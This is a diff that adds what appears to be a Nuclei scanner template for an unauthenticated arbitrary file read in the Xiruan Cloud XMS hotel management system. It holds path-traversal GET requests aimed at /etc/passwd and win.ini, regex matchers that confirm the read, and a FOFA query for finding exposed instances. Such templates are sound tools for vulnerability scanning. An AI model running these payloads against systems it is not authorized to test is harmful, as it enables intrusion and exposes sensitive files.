@@ -1,0 +1,37 @@
+id: xiruan-FoxhisFileServer-action-fileread
+info:
+  name: 西软云XMS download 存在任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 西软云 XMS 是基于云平台数据中心开发的支持多酒店、多语言、多平台的酒店管理系统。西软云XMS download接口存在任意文件读取漏洞。未经授权的远程攻击者可以利用该漏洞，造成敏感信息泄露。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/oz08gkewh26f3wk3
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: title="西软云XMS" || body="WebXMS" || body="西软云XMS"
+    tips:
+    repair:
+    version:
+  tags: fileread,xiruan
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/FoxhisFileServer/action?method=download&filename=/..//..//..//..//..//..//..//..//..//..//..//../etc/passwd"
+      - "{{BaseURL}}/FoxhisFileServer/action?method=download&filename=/..//..//..//..//..//..//..//..//..//..//..//../c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
